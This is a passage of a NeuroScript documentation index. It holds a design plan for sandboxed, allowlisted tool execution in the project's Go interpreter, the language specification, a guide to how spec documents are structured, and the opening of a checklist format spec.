allowlist/denylist (similar to SecurityLayer). These would need to be loaded based on configuration passed to the interpreter. In executeCall, when strings.HasPrefix(target, \"TOOL.\") is true and restrictedToolMode is true: Perform allowlist/denylist checks before getting the toolImpl. Crucially, how to handle argument validation? executeCall gets evaluatedArgs as []interface{}, while SecurityLayer.ValidateToolCall expects map[string]interface{} (like the LLM FunctionCall). This mismatch is problematic. We'd need to reconstruct the arg map from the toolImpl.Spec and the ordered evaluatedArgs before passing to a validation function similar to SecurityLayer.validateArgumentsAgainstSpec. This adds complexity. If validation passes, execute toolImpl.Func. If restrictedToolMode is false, execute normally. Option B: Introduce a \"Restricted Caller Context\": Modify the ToolFunc signature slightly or pass context differently. Maybe ToolFunc func(interpreter Interpreter, args []interface{}, callCtx ToolCallContext) (interface{}, error). ToolCallContext could include info like IsRestricted bool. Inside ToolFunc implementations (e.g., toolReadFile, toolExecuteCommand), check callCtx.IsRestricted. If true, apply stricter internal checks (e.g., always deny toolExecuteCommand, enforce stricter path validation). This distributes the checks into each tool, which might be less maintainable and harder to configure centrally via allow/deny lists. Argument validation still needs handling before the call. Option C: Introduce a New High-Level \"Run Restricted\" Function: Create a new function like Interpreter.RunProcedureRestricted(procName string, allowlist []string, denylist map[string]bool, sandboxRoot string, args ...string). This function would create/configure a temporary SecurityLayer (or similar validation logic) specifically for this execution. It would then call the regular RunProcedure. The core challenge remains: how does the inner executeCall know it needs to apply restrictions? It needs context passed down. Option D: New Interpreter Execution Mode: Similar to Option A, add a mode flag (restrictedToolMode) and configuration (allow/deny lists, sandbox root) to the Interpreter. When restrictedToolMode is set: In executeCall for TOOL.* calls: Look up the ToolSpec. Check allow/deny lists. Argument Validation: Convert the positional evaluatedArgs []interface{} into a map[string]interface{} using the ToolSpec.Args names. This is the key step. Call a validation function (like SecurityLayer.ValidateToolCall, potentially refactored to be reusable or copied) using the constructed arg map, allow/deny lists, and sandbox root. This validator performs type checks, sandbox checks, etc. If validation fails, return an error to the script. If validation passes, execute the toolImpl.Func with the original (but validated types) convertedArgs []interface{}. Note: the validation function might return validated/coerced values, but the tool func still expects []interface{}. Ensure consistency. Refinement - Option D: This seems the most robust. It keeps the validation logic centralized (reusing or adapting the SecurityLayer's logic) and modifies the core executeCall based on an interpreter mode. The main work is mapping positional args to named args for validation and then ensuring the validated args are passed correctly. Detailed Plan (Option D):</p> <p>Modify Interpreter Struct (pkg/core/interpreter.go): Add fields: isRestrictedMode bool restrictedAllowlist map[string]bool restrictedDenylist map[string]bool restrictedSandboxRoot string Modify NewInterpreter (or add a new setup function): Allow setting the restriction mode and related configuration when the interpreter is created or configured. Modify Interpreter.executeCall (pkg/core/interpreter_simple_steps.go): Inside the if strings.HasPrefix(target, \"TOOL.\") block: Add a check: if i.isRestrictedMode { ... }. Inside the if i.isRestrictedMode block: Look up toolImpl and toolSpec as currently done. Handle tool not found. Check Denylist: if i.restrictedDenylist[toolName] { return nil, fmt.Errorf(\"tool '%s' denied in restricted mode\", toolName) }. Check Allowlist: if !i.restrictedAllowlist[toolName] { return nil, fmt.Errorf(\"tool '%s' not allowed in restricted mode\", toolName) }. Check High-Risk (e.g., ExecuteCommand): Add specific checks if needed (redundant if denylisted). if toolName == \"TOOL.ExecuteCommand\" { return nil, ... }. Prepare Args for Validation: Create rawArgsMap := make(map[string]interface{}). Iterate through toolSpec.Args and evaluatedArgs. If idx &lt; len(evaluatedArgs), map toolSpec.Args[idx].Name to evaluatedArgs[idx]. Validate Arguments: Call a validation function. This could be a refactored version of SecurityLayer.validateArgumentsAgainstSpec that takes the interpreter's restriction config. Let's call it validateRestrictedArgs(toolSpec, rawArgsMap, i.restrictedSandboxRoot). This function performs type checks, sandbox checks (using SecureFilePath with i.restrictedSandboxRoot), etc. It should return the validated map (or potentially just an error). Handle Validation Error: If validateRestrictedArgs returns an error, propagate it wrapped in context (e.g., fmt.Errorf(\"restricted tool call validation failed for '%s': %w\", toolName, validationErr)). Proceed to Execution (if validation passed): The arguments passed to toolImpl.Func should still be the original evaluatedArgs []interface{} slice, because ValidateAndConvertArgs is not called here in the same way as the LLM agent path. The validateRestrictedArgs step primarily serves as a check rather than a conversion pass in this context (though it must perform type checks). We rely on the initial evaluateExpression having produced compatible types. Call callResultValue, callErr = toolImpl.Func(i, evaluatedArgs). Store i.lastCallResult = callResultValue if callErr == nil. Handle callErr. Outside the if i.isRestrictedMode block (i.e., else): Execute the tool directly as it's currently done (find tool, call ValidateAndConvertArgs, call Func). Refactor Validation Logic (from pkg/core/security_validation.go): Create a new function validateRestrictedArgs (or similar) that takes ToolSpec, map[string]interface{}, and sandboxRoot. This function should reuse the core logic from validateArgumentsAgainstSpec (type checking, sandbox checking using SecureFilePath) but doesn't need to return a modified map if the goal is just validation. It just needs to return an error if any check fails. It primarily ensures arguments conform to the spec and stay within the sandbox. Update neurogo CLI (pkg/neurogo/app.go, config.go, app_script.go): Add a new flag (e.g., -restricted) to config.go and ParseFlags. When running in script mode (app_script.go), if the -restricted flag is set: Load the allowlist/denylist files specified by the agent flags (-allowlist, -denylist). Load the sandbox root (-sandbox). Configure the created Interpreter instance with isRestrictedMode = true and the loaded lists/root. Testing: Add tests for Interpreter.RunProcedure where isRestrictedMode is true. Test cases should include: Calling an allowed tool (e.g., StringLength). Calling a denied tool (e.g., ExecuteCommand if denylisted). Calling a non-allowlisted tool. Calling a file tool (ReadFile) with a path inside the sandbox. Calling a file tool (ReadFile) with a path outside the sandbox (should fail validation). Calling a tool with incorrect argument types (should fail validation). Self-Check:</p> <p>Does the plan address the user's request? Yes. Does it leverage existing components (Interpreter, SecurityLayer logic)? Yes. Does it handle the argument type mismatch (slice vs map)? Yes, by reconstructing the map for validation. Is it reasonably secure? Yes, by applying allow/deny lists and sandbox checks. Does it require Go code changes? Yes, in Interpreter, execution logic, validation logic, and CLI handling. Does it require NeuroScript changes? No. Confidence Score: 4/5 (Complexity in correctly mapping/validating args and integrating the mode requires careful implementation).</p> <p>Action: Generate the Go code modifications based on Option D. Provide updated interpreter.go, interpreter_simple_steps.go, a new security_restricted_validation.go (or similar for the refactored validation), config.go, and app_script.go.</p>"},{"location":"script_spec/","title":"NeuroScript: A script for humans, AIs and computers","text":"<p>Version: 0.1.0</p> <p>NeuroScript is a structured, human-readable language that provides a procedural scaffolding for large language models (LLMs). It is designed to store, discover, and reuse \"skills\" (procedures) with clear docstrings and robust metadata, enabling AI systems to build up a library of reusable, well-documented knowledge.</p>"},{"location":"script_spec/#1-goals-and-principles","title":"1. Goals and Principles","text":"<ol> <li>Explicit Reasoning: Rather than relying on hidden chain-of-thought, NeuroScript encourages step-by-step logic in a code-like format that is both executable and self-documenting.</li> <li>Reusable Skills: Each procedure is stored and can be retrieved via a standard interface. LLMs or humans can then call, refine, or extend these procedures without re-implementing from scratch.</li> <li>Self-Documenting: NeuroScript procedures should include docstrings that clarify purpose, inputs, outputs, algorithmic rationale, language version, and caveats\u2014mirroring how humans comment code.</li> <li>LLM Integration: NeuroScript natively supports calling LLMs for tasks that benefit from free-form generation, pattern matching, or advanced \u201chuman-like\u201d reasoning.</li> <li>Structured Data: Supports basic list (<code>[]</code>) and map (<code>{}</code>) literals inspired by JSON/Python for handling structured data.</li> <li>Versioning: Supports file-level and procedure-level version tracking.</li> </ol>"},{"location":"script_spec/#2-language-constructs","title":"2. Language Constructs","text":""},{"location":"script_spec/#21-high-level-structure","title":"2.1 High-Level Structure","text":"<p>A NeuroScript file (<code>.ns.txt</code>) typically contains:</p> <ol> <li>Optional <code>FILE_VERSION</code> declaration (See 2.5)</li> <li>Zero or more <code>DEFINE PROCEDURE</code> blocks.</li> <li>Comments (<code>#</code> or <code>--</code>) and blank lines can appear between elements.</li> </ol> <p>Each procedure definition follows this structure:</p> <ol> <li><code>DEFINE PROCEDURE</code> Name( Arguments ) <code>NEWLINE</code></li> <li>Optional <code>COMMENT:</code> block (Docstring) ending with <code>ENDCOMMENT</code> (lexed as <code>COMMENT_BLOCK</code>)</li> <li>Statements (the pseudocode body, including nested blocks)</li> <li><code>END</code> <code>NEWLINE</code>? to close the procedure definition</li> </ol> <p>Example (Illustrating Current Syntax):</p> <pre><code># Optional File Version Declaration\nFILE_VERSION \"1.0.0\"\n\n# Example Procedure\nDEFINE PROCEDURE ProcessChecklist(checklist_items)\nCOMMENT:\n    PURPOSE: Processes a checklist, potentially logging items.\n    INPUTS: - checklist_items: A list of map objects, where each map has \"task\" (string) and \"status\" (string). Example: `[{\"task\":\"Review\", \"status\":\"done\"}, {\"task\":\"Implement\", \"status\":\"pending\"}]`\n    OUTPUT: A summary message (string).\n    LANG_VERSION: 1.1.0\n    ALGORITHM:\n        1. Initialize counters.\n        2. Iterate through the checklist items using FOR EACH.\n        3. Access task and status from each item map using `item[\"key\"]` syntax.\n        4. Log or process based on status using IF/THEN/ELSE/ENDBLOCK.\n        5. Return summary using string concatenation.\n    CAVEATS: Assumes input is a valid list of maps. Requires arithmetic tools/support for counts.\n    EXAMPLES: ProcessChecklist('[{\"task\":\"A\", \"status\":\"done\"}]') =&gt; \"Processed 1 items. Done: 1, Pending: 0\"\nENDCOMMENT # Lexer requires ENDCOMMENT here\n\nSET done_count = 0\nSET pending_count = 0\nSET summary = \"\" # Final summary\n\nEMIT \"Processing checklist...\"\n\nFOR EACH item IN checklist_items DO # Iterates list elements\n    SET current_task = item[\"task\"]   # Map access\n    SET current_status = item[\"status\"] # Map access\n\n    EMIT \"Processing Task: \" + current_task # Direct concatenation\n\n    IF current_status == \"done\" THEN\n        # SET done_count = done_count + 1 # Requires arithmetic support\n        EMIT \"  Status: Done\"\n    ELSE\n        # SET pending_count = pending_count + 1 # Requires arithmetic support\n        EMIT \"  Status: Pending\"\n    ENDBLOCK # End IF block\n\nENDBLOCK # End FOR EACH block\n\n# SET summary = \"Processed items. Done: \" + done_count + \", Pending: \" + pending_count # Requires arithmetic + conversion\nSET summary = \"Finished processing checklist.\" # Placeholder\nRETURN summary\n\nEND # End DEFINE PROCEDURE\n</code></pre>"},{"location":"script_spec/#22-statements-syntax-v110-explicit-eval-model","title":"2.2 Statements &amp; Syntax (v1.1.0 - Explicit EVAL Model)","text":"<p>Statements are processed line by line. Comments (<code>#</code> or <code>--</code>) are ignored. Blank lines are allowed.</p> <ul> <li> <p><code>DEFINE PROCEDURE Name(arg1, arg2, ...)</code> <code>NEWLINE</code></p> <ul> <li>Starts a procedure definition. Arguments are optional.</li> </ul> </li> <li> <p><code>COMMENT:</code> ... <code>ENDCOMMENT</code></p> <ul> <li>Defines a multi-line docstring block (lexed as <code>COMMENT_BLOCK</code>). See Section 2.4.</li> </ul> </li> <li> <p><code>SET variable = expression</code> <code>NEWLINE</code></p> <ul> <li>Assigns the raw result of an <code>expression</code> to a <code>variable</code>. Expression evaluation does not automatically resolve <code>{{placeholders}}</code>. Use <code>EVAL()</code> for that.</li> </ul> </li> <li> <p><code>CALL target(arg1, arg2, ...)</code> <code>NEWLINE</code></p> <ul> <li>Invokes another procedure, an LLM, or an external tool. Arguments passed are the raw evaluated results of the argument expressions.</li> <li><code>CALL ProcedureName(...)</code></li> <li><code>CALL LLM(prompt_expression)</code></li> <li><code>CALL TOOL.FunctionName(...)</code><ul> <li>Implemented Tools: <code>ReadFile</code>, <code>WriteFile</code>, <code>ListDirectory</code>, <code>LineCount</code>, <code>SanitizeFilename</code>, <code>GitAdd</code>, <code>GitCommit</code>, <code>VectorUpdate</code> (mock), <code>SearchSkills</code> (mock), <code>ExecuteCommand</code>, <code>GoBuild</code>, <code>GoCheck</code>, <code>GoTest</code>, <code>GoFmt</code>, <code>GoModTidy</code>, <code>StringLength</code>, <code>Substring</code>, <code>ToUpper</code>, <code>ToLower</code>, <code>TrimSpace</code>, <code>SplitString</code>, <code>SplitWords</code>, <code>JoinStrings</code>, <code>ReplaceAll</code>, <code>Contains</code>, <code>HasPrefix</code>, <code>HasSuffix</code>.</li> </ul> </li> <li>The raw result of the <code>CALL</code> is stored internally, accessible via the <code>LAST</code> keyword.</li> </ul> </li> <li> <p><code>RETURN expression</code> <code>NEWLINE</code></p> <ul> <li>Returns the raw evaluated result of the optional <code>expression</code>. Terminates the current procedure.</li> </ul> </li> <li> <p><code>EMIT expression</code> <code>NEWLINE</code></p> <ul> <li>Evaluates the <code>expression</code> to its raw value and prints its string representation to standard output, prefixed with <code>[EMIT]</code>.</li> </ul> </li> <li> <p><code>IF condition THEN</code> <code>NEWLINE</code> ... <code>ELSE</code> <code>NEWLINE</code> ... <code>ENDBLOCK</code> <code>NEWLINE</code></p> <ul> <li>Starts a conditional block. <code>ELSE</code> part is optional.</li> <li><code>condition</code>: <code>expr1 op expr2</code> (where <code>op</code> is <code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>) or a single <code>expression</code>.</li> <li>Boolean evaluation: <code>true</code>, non-zero numbers, strings <code>\"true\"</code>/<code>\"1\"</code> are true. <code>false</code>, <code>0</code>, other strings, <code>nil</code>, lists, maps are false. Comparison follows rules in <code>evaluation_comparison.go</code>.</li> <li>Terminated by <code>ENDBLOCK</code>.</li> </ul> </li> <li> <p><code>WHILE condition DO</code> <code>NEWLINE</code> ... <code>ENDBLOCK</code> <code>NEWLINE</code></p> <ul> <li>Starts a loop block, terminated by <code>ENDBLOCK</code>.</li> <li><code>condition</code> syntax same as <code>IF</code>.</li> </ul> </li> <li> <p><code>FOR EACH variable IN collection DO</code> <code>NEWLINE</code> ... <code>ENDBLOCK</code> <code>NEWLINE</code></p> <ul> <li>Starts a loop block, terminated by <code>ENDBLOCK</code>.</li> <li><code>collection</code> is an expression evaluating to a list, map, or string.</li> <li>Iteration Behavior:<ul> <li>List (<code>[]interface{}</code> or <code>[]string</code>): Iterates elements. <code>variable</code> gets each element.</li> <li>Map (<code>map[string]interface{}</code>): Iterates keys (sorted alphabetically). <code>variable</code> gets each key (string).</li> <li>String: Iterates characters (runes). <code>variable</code> gets each character (string).</li> <li>Nil/Other: 0 iterations.</li> </ul> </li> </ul> </li> <li> <p><code>END</code> <code>NEWLINE</code>?</p> <ul> <li>Terminates <code>DEFINE PROCEDURE</code> block.</li> </ul> </li> </ul>"},{"location":"script_spec/#23-expressions-literals-and-evaluation","title":"2.3 Expressions, Literals, and Evaluation","text":"<ul> <li> <p>Literals:</p> <ul> <li>String: <code>\"...\"</code> or <code>'...'</code> (standard escapes <code>\\\"</code>, <code>\\'</code>, <code>\\\\</code>, <code>\\n</code>, <code>\\r</code>, <code>\\t</code>). Represents the raw string content.</li> <li>List: <code>[</code> <code>]</code> containing comma-separated expressions. Example: <code>[\"a\", 1, true, [\"nested\"]]</code>. Evaluates to <code>[]interface{}</code> containing raw evaluated elements.</li> <li>Map: <code>{</code> <code>}</code> containing comma-separated <code>string_key : expression</code> pairs. Keys must be string literals. Example: <code>{\"name\": \"Thing\", \"value\": 10, \"tags\": [\"A\", \"B\"]}</code>. Evaluates to <code>map[string]interface{}</code> containing raw evaluated values.</li> <li>Number: <code>123</code>, <code>4.5</code>. Parsed as <code>int64</code> or <code>float64</code>.</li> <li>Boolean: <code>true</code>, <code>false</code>. Parsed as <code>bool</code>.</li> </ul> </li> <li> <p>Variables: <code>variable_name</code> (e.g., <code>my_var</code>). Evaluates to the raw value stored in the variable.</p> </li> <li> <p><code>LAST</code> Keyword: Evaluates to the raw value returned by the most recent <code>CALL</code> statement in the current scope.</p> </li> <li> <p>Placeholders: <code>{{variable_name}}</code> or <code>{{LAST}}</code>. This syntax is only processed when used inside a string passed to the <code>EVAL()</code> function. In all other contexts, it's treated as part of a raw string or causes a parse error if used standalone where an expression is expected.</p> </li> <li> <p><code>EVAL(expression)</code>: Evaluates the inner <code>expression</code> to get a raw value (typically a string). Then, recursively resolves any <code>{{placeholder}}</code> syntax within that resulting string using current variable/<code>LAST</code> values. Returns the final resolved string. This is the only mechanism for placeholder expansion.</p> </li> <li> <p>Concatenation (<code>+</code>): Evaluates operands to raw values, converts them to their string representation (<code>fmt.Sprintf(\"%v\", val)</code>), and joins the strings. Does not resolve placeholders.</p> </li> <li> <p>Element Access: <code>collection_expr[accessor_expr]</code></p> <ul> <li>Evaluates <code>collection_expr</code> (must be list or map).</li> <li>Evaluates <code>accessor_expr</code>.</li> <li>For lists (<code>[]interface{}</code>), accessor must evaluate to an integer (int64) index (0-based). Returns element or error if out of bounds/wrong type.</li> <li>For maps (<code>map[string]interface{}</code>), accessor is converted to string key. Returns value or error if key not found.</li> </ul> </li> </ul>"},{"location":"script_spec/#24-docstrings-comment-block","title":"2.4 Docstrings (<code>COMMENT:</code> Block)","text":"<ul> <li>Optional block immediately following <code>DEFINE PROCEDURE</code>, starting with <code>COMMENT:</code> and terminated by the lexer rule using <code>ENDCOMMENT</code>.</li> <li>Content is skipped by the parser but parsed semantically by the Go <code>parseDocstring</code> function.</li> <li>Recommended sections (parsed by <code>parseDocstring</code>):<ul> <li><code>PURPOSE:</code> (Required)</li> <li><code>INPUTS:</code> (Required) Use <code>- name: description</code> format or <code>INPUTS: None</code>.</li> <li><code>OUTPUT:</code> (Required) Use <code>OUTPUT: None</code> if applicable.</li> <li><code>LANG_VERSION:</code> (Optional, New) Semantic version string (e.g., <code>1.1.0</code>) indicating the NeuroScript version targeted.</li> <li><code>ALGORITHM:</code> (Required)</li> <li><code>CAVEATS:</code> (Optional)</li> <li><code>EXAMPLES:</code> (Optional)</li> </ul> </li> </ul>"},{"location":"script_spec/#25-versioning-conventions-new-section","title":"2.5 Versioning Conventions (New Section)","text":"<ul> <li>File Version:<ul> <li>Syntax: <code>FILE_VERSION \"semver_string\"</code> (e.g., <code>FILE_VERSION \"1.0.0\"</code>)</li> <li>Placement: Optional, must appear before any <code>DEFINE PROCEDURE</code> lines, usually at the top of the <code>.ns.txt</code> file after initial comments/newlines.</li> <li>Purpose: Indicates the version of the content within the specific file.</li> <li>Convention: Tooling (like an editor extension or a dedicated script) should ideally increment the patch number (the last part) automatically whenever the file is saved with changes. This is a tooling convention, not enforced by the parser.</li> </ul> </li> <li>Language Version:<ul> <li>Syntax: <code>LANG_VERSION: semver_string</code> (e.g., <code>LANG_VERSION: 1.1.0</code>)</li> <li>Placement: Optional, within the <code>COMMENT:</code> block of a specific procedure definition.</li> <li>Purpose: Indicates the version of the NeuroScript language specification that the procedure was written for or tested against. Helps manage compatibility as the language evolves.</li> </ul> </li> </ul>"},{"location":"script_spec/#3-storing-and-discovering-procedures","title":"3. Storing and Discovering Procedures","text":"<p>(No change from previous version - structure remains the same)</p>"},{"location":"script_spec/#31-skill-registry-schema","title":"3.1 Skill Registry Schema","text":"<p>Requires a repository/database storing: name, docstring, code, version/timestamp, embeddings. [TODO: Implement real indexing]</p>"},{"location":"script_spec/#32-retrieval-discovery","title":"3.2 Retrieval &amp; Discovery","text":"<p>Vector Search (<code>TOOL.SearchSkills</code> mock) or Keyword Search. [TODO: Implement real search]</p>"},{"location":"script_spec/#33-api-or-functions","title":"3.3 API or Functions","text":"<p>Conceptual: <code>search_procedures</code>, <code>get_procedure</code>, <code>save_procedure</code>.</p>"},{"location":"script_spec/#4-interfacing-with-llms","title":"4. Interfacing with LLMs","text":""},{"location":"script_spec/#41-call-llmprompt_expression","title":"4.1 <code>CALL LLM(prompt_expression)</code>","text":"<ol> <li>Evaluates <code>prompt_expression</code> to its raw value (string).</li> <li>Sends the prompt string to the LLM gateway (Gemini).</li> <li>Returns the raw text response, storing it internally, accessible via <code>LAST</code>.</li> </ol> <p>Example:</p> <pre><code>SET text_to_analyze = \"NeuroScript seems promising.\"\n# Construct prompt using direct concatenation\nSET analysis_prompt = \"Analyze the following text for sentiment (positive/negative/neutral): \" + text_to_analyze\n# Call LLM, result stored internally\nCALL LLM(analysis_prompt)\n# Assign result using LAST\nSET analysis_result = LAST\n\n# Compare using direct variable\nIF analysis_result == \"positive\" THEN\n    RETURN \"Positive Sentiment Detected\"\nENDBLOCK\nRETURN \"Sentiment: \" + analysis_result\n</code></pre>"},{"location":"script_spec/#42-variation-provide-context-or-additional-instructions-todo","title":"4.2 Variation: Provide Context or Additional Instructions [TODO]","text":"<p>Future: <code>CALL LLM_WITH_CONTEXT(contextData, \"prompt\")</code>.</p>"},{"location":"script_spec/#5-built-in-reasoning-constructs-todo","title":"5. Built-In Reasoning Constructs [TODO]","text":"<p>Future: <code>ASSERT</code>, <code>VERIFY</code>, <code>REFLECT</code>.</p>"},{"location":"script_spec/#6-example-workflow","title":"6. Example Workflow","text":"<p>(No significant change, relies on future tools)</p>"},{"location":"script_spec/#7-implementation-and-architecture","title":"7. Implementation and Architecture","text":""},{"location":"script_spec/#71-neuroscript-interpreter-go-implementation","title":"7.1 NeuroScript Interpreter (Go Implementation)","text":"<ul> <li>Parsing: Handles core syntax including <code>FILE_VERSION</code>, blocks (<code>IF/THEN/ELSE/ENDBLOCK</code>, <code>WHILE/DO/ENDBLOCK</code>, <code>FOR/EACH/IN/DO/ENDBLOCK</code>), list <code>[]</code> and map <code>{}</code> literals, <code>LAST</code> keyword, <code>EVAL()</code> syntax. Uses ANTLR4.</li> <li>Execution: Handles <code>SET</code>, <code>CALL</code>, <code>RETURN</code>, <code>EMIT</code>. Evaluates expressions (concatenation <code>+</code>, literals, variables, <code>LAST</code>, <code>EVAL</code>). Implements list/map element access (<code>[]</code>). Executes blocks correctly, including <code>FOR EACH</code> iteration over lists (elements), maps (keys), and strings (chars). Implements conditions (<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>) based on <code>evaluation_comparison.go</code>.</li> <li>Error Handling: Propagates Go errors from tools/evaluation; basic runtime error reporting. [TODO: Add specific NeuroScript error types/handling (TRY/CATCH?)]</li> <li>Docstring Parsing: Parses <code>COMMENT:</code> block content semantically using <code>parseDocstring</code> in Go, extracting standard sections and <code>LANG_VERSION</code>.</li> </ul>"},{"location":"script_spec/#72-database-store","title":"7.2 Database / Store","text":"<ul> <li>[TODO: Implement] Mocked currently (<code>TOOL.SearchSkills</code>, <code>TOOL.VectorUpdate</code>).</li> </ul>"},{"location":"script_spec/#73-llm-gateway","title":"7.3 LLM Gateway","text":"<ul> <li>Currently targets Gemini API. [TODO: Make configurable].</li> </ul>"},{"location":"script_spec/#74-version-control","title":"7.4 Version Control","text":"<ul> <li>Basic <code>TOOL.GitAdd</code>, <code>TOOL.GitCommit</code> implemented. [TODO: More robust Git management needed (branching, status, pull?)].</li> </ul>"},{"location":"script_spec/#8-summary-and-future-directions","title":"8. Summary and Future Directions","text":"<ul> <li>NeuroScript provides structured pseudocode for explicit AI reasoning and skill accumulation.</li> <li>Docstrings (<code>COMMENT:</code> block) are crucial, with conventions like <code>LANG_VERSION</code>. File-level versioning via <code>FILE_VERSION</code>.</li> <li>Explicit Evaluation: <code>EVAL()</code> is required for placeholder resolution; standard evaluation returns raw values. <code>LAST</code> keyword accesses prior <code>CALL</code> result.</li> <li>Store/Discover/Retrieve via external tools connected to Git/Vector DB is key. [TODO: Implement fully]</li> <li>LLM Integration via <code>CALL LLM</code> is central.</li> <li>Current Implementation: Core parsing and execution working for most defined syntax (including blocks, lists, maps, access, <code>LAST</code>, <code>EVAL</code>). Basic tools available.</li> <li>Next Steps: Implement real Vector DB/Git integration; Add arithmetic; Add NeuroScript-specific error handling; Add more tools (HTTP, JSON, etc.); Refine LLM integration (context passing, configuration). Consider LSP server implementation.</li> </ul> <p>```</p> <p>This updated specification incorporates the <code>FILE_VERSION</code> and <code>LANG_VERSION</code> conventions, clarifies the explicit <code>EVAL</code> / <code>LAST</code> / placeholder model, updates syntax based on the G4 grammar (e.g., <code>THEN</code>, <code>ENDBLOCK</code>), lists the currently implemented tools, and provides a more accurate summary of the current implementation state.</p>"},{"location":"specification_structure/","title":"Spec Structure Guide","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.0 :: id: spec-structure-guideline :: status: draft :: dependsOn: docs/metadata.md :: howToUpdate: Review existing specs ensure they align or update this guideline.</p>"},{"location":"specification_structure/#neuroscript-specification-document-structure-guideline","title":"NeuroScript Specification Document Structure Guideline","text":""},{"location":"specification_structure/#1-purpose","title":"1. Purpose","text":"<p>This document defines a standard structure for all specification files (files with <code>:: subtype: spec</code> metadata) within the NeuroScript project. The goal is to ensure consistency, improve readability for all users (human and AI), and make it easier to locate key information quickly.</p>"},{"location":"specification_structure/#2-example-specification-structure","title":"2. Example Specification Structure","text":"<p>All specification documents should generally follow the structure demonstrated below. The Example section (Section 2) should always provide a concise, illustrative example of the format or concept being specified.</p> <pre><code># --- Start Example Spec File ---\n\n:: type: NSproject # Or more specific like NeuroData\n:: subtype: spec\n:: version: 0.1.0\n:: id: example-format-spec\n:: status: draft\n:: dependsOn: docs/metadata.md, ... # Other dependencies\n:: howToUpdate: ...\n\n# Title of the Specification (e.g., NeuroData Widget Format Spec)\n\n## 1. Purpose\n\n*Briefly state the goal and scope of the format or component being specified.*\n\n## 2. Example\n\n*Provide a clear, concise, and illustrative example of the format or concept.*\n*This should give the reader an immediate understanding of what it looks like.*\n```widget-format\n# Example widget data\nWidget {\n  id: \"widget-001\",\n  color: \"blue\",\n  enabled: true\n}\n</code></pre>"},{"location":"specification_structure/#3-design-choices-rationale-optional","title":"3. Design Choices / Rationale (Optional)","text":"<p>Explain the key decisions made during the design. Why was this approach chosen over alternatives? What trade-offs were made?</p>"},{"location":"specification_structure/#4-syntax-format-definition-component-breakdown","title":"4. Syntax / Format Definition / Component Breakdown","text":"<p>Provide the detailed definition of the syntax, format rules, or component parts. Use subsections (e.g., 4.1, 4.2) for clarity. Reference other specifications or standards where appropriate.</p>"},{"location":"specification_structure/#41-component-a","title":"4.1 Component A","text":"<p>Details...</p>"},{"location":"specification_structure/#42-component-b","title":"4.2 Component B","text":"<p>Details...</p>"},{"location":"specification_structure/#5-ebnf-grammar-optional","title":"5. EBNF Grammar (Optional)","text":"<p>If applicable, provide an EBNF (Extended Backus-Naur Form) or similar formal grammar. <pre><code>widget ::= 'Widget' '{' ... '}' ;\n...\n</code></pre></p>"},{"location":"specification_structure/#6-tooling-requirements-interaction-optional","title":"6. Tooling Requirements / Interaction (Optional)","text":"<p>Describe how software tools are expected to interact with this format. What parsing logic is needed? Are there specific validation rules tools should enforce? Are specific NeuroScript TOOLs expected to consume or produce this format?</p>"},{"location":"specification_structure/#-end-example-spec-file-","title":"--- End Example Spec File ---","text":"<p>```</p>"},{"location":"specification_structure/#3-standard-section-definitions","title":"3. Standard Section Definitions","text":"<p>The following sections should be used, in this order:</p> <ol> <li>Purpose: (Required) Clearly and concisely state what the specification defines and its intended scope.</li> <li>Example: (Required) Provide at least one clear, representative example of the format or concept being specified. This should be sufficient for a reader to get a basic understanding at a glance.</li> <li>Design Choices / Rationale: (Optional but Recommended) Explain the reasoning behind key design decisions. This helps others understand the context and potential trade-offs.</li> <li>Syntax / Format Definition: (Required) This is the core section detailing the rules, structure, components, and semantics of the item being specified. Use subsections for clarity.</li> <li>EBNF Grammar: (Optional) Include if a formal grammar aids in defining the syntax precisely.</li> <li>AI Reading This section should give clear, concise instructions for how AIs (such as LLMs) should understand the contents of the file. This may be included in prompts to the AI.</li> <li>AI Writing This section should give clear, concise additional instructions for how AIs (such as LLMs) should write contents of the file, such as cross checks to perform. This may be included in prompts to the AI.</li> <li>Tooling Requirements / Interaction: (Optional but Recommended for data formats) Describe how tools should parse, validate, or otherwise interact with the format. This section will be used primarily when building computer tools to manipulate the format.</li> </ol>"},{"location":"specification_structure/#4-metadata-requirements","title":"4. Metadata Requirements","text":"<p>All specification files must begin with standard file-level metadata as defined in [metadata.md]. This must include: * <code>:: type: NSproject</code> (or a more specific type if applicable, like <code>NeuroData</code>) * <code>:: subtype: spec</code> * <code>:: version: &lt;semver&gt;</code> * <code>:: status: &lt;status_string&gt;</code> (e.g., <code>draft</code>, <code>approved</code>) * <code>:: dependsOn: ...</code> (List dependencies, including <code>docs/metadata.md</code> and this document) * <code>:: howToUpdate: ...</code> (Instructions for maintenance) * <code>:: id: &lt;unique_spec_id&gt;</code> (A unique identifier for the specification)</p> <p>Adhering to this structure will help maintain consistency across all NeuroScript project specification documents.</p>"},{"location":"NeuroData/checklist/","title":"Checklist","text":"<p>:: version: 0.5.0 :: dependsOn: pkg/neurodata/checklist/scanner_parser.go, pkg/neurodata/checklist/defined_errors.go, docs/conventions.md :: howToUpdate: Review scanner_parser.go and defined_errors.go, ensure syntax, error handling (ErrMalformedItem, ErrNoContent), parsing logic (string manip, not regex), status conventions, rollup logic, and examples are accurate.</p>"},{"location":"NeuroData/checklist/#neurodata-checklist-format-ndcl-specification","title":"NeuroData Checklist Format (.ndcl) Specification","text":""},{"location":"NeuroData/checklist/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Checklists provide a simple, human-readable format for tracking tasks, requirements, or states. They are designed to be easily parsed and manipulated by tools while remaining clear in plain text. They use a syntax based on Markdown task lists, with an extension for items whose status is automatically derived from children.</p>"},{"location":"NeuroData/checklist/#2-syntax","title":"2. Syntax","text":"<p>A checklist file or block primarily consists of checklist item lines, optionally preceded by file-level metadata. Comments and blank lines are also permitted. The parser uses string manipulation (not regular expressions) to identify items.</p>"},{"location":"NeuroData/checklist/#21-checklist-item-line","title":"2.1 Checklist Item Line","text":"<p>Each checklist item starts with an optional indentation, followed by a hyphen (<code>-</code>), one or more spaces, and then either square brackets <code>[]</code> for manual items or pipe symbols <code>||</code> for automatic items, enclosing a status symbol.</p> <p>Manual Item: <pre><code>Optional Indentation + \"- \" + \"[\" + Status Symbol + \"]\" + Optional Whitespace + Description Text\n</code></pre></p> <p>Automatic Item: <pre><code>Optional Indentation + \"- \" + \"|\" + Status Symbol + \"|\" + Optional Whitespace + Description 